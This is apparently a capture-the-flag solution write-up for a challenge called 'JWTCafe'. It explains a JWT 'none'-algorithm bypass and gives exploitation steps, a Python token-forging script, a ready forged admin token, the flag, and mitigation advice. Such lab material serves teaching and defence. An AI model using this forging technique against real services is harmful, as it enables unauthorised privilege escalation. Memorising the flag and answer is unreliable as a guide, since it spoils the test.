# Challenge 11: JWTCafe - Solution

## Vulnerability Type
**JWT Algorithm Confusion / "none" Algorithm Bypass**

## Description
The application accepts JWTs with the "none" algorithm, which means no signature verification is performed, allowing attackers to forge tokens.

## Vulnerable Code
```javascript
// VULNERABLE: if alg=none, skip signature check
const role = payload.role;
// No signature verification when alg="none"
```

## Exploitation Steps

1. Login with credentials: `guest` / `guest123`
2. Copy the JWT token provided
3. Decode the JWT (use jwt.io or base64 decode):
   - Header: `{"alg":"HS256","typ":"JWT"}`
   - Payload: `{"sub":"guest","role":"guest","iat":...}`
4. Modify the JWT:
   - Change header `alg` to `"none"`
   - Change payload `role` to `"admin"`
5. Encode the modified JWT (base64url encode)
6. Remove the signature part (everything after the second dot)
7. Use the forged token to access `/menu`

## Manual JWT Forging

**Original JWT structure:**
```
header.payload.signature
```

**Modified JWT:**
```
Header: {"alg":"none","typ":"JWT"}
Payload: {"sub":"guest","role":"admin","iat":1234567890}
```

**Base64url encode:**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTIzNDU2Nzg5MH0.
```

Note the trailing dot with no signature.

## Using Python
```python
import base64
import json

def base64url_encode(data):
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip('=')

header = json.dumps({"alg":"none","typ":"JWT"})
payload = json.dumps({"sub":"guest","role":"admin","iat":1234567890})

token = f"{base64url_encode(header)}.{base64url_encode(payload)}."
print(token)
```

## Flag
```
FCTF{jwt_n0n3_4lg_byp4ss}
```

## How It Works
- JWT has three parts: header, payload, signature
- The `alg` field in header specifies the signing algorithm
- `"none"` algorithm means "no signature required"
- Vulnerable implementations accept `alg: "none"` without verification
- Attacker can forge any token by setting `alg: "none"`

## Mitigation
- Never accept `alg: "none"` in production
- Explicitly whitelist allowed algorithms:
  ```javascript
  const allowedAlgs = ['HS256', 'RS256'];
  if (!allowedAlgs.includes(header.alg)) {
      throw new Error('Invalid algorithm');
  }
  ```
- Use a proper JWT library with signature verification
- Always verify signatures
- Use strong signing keys
- Implement proper key rotation
- Consider using asymmetric algorithms (RS256) for better security
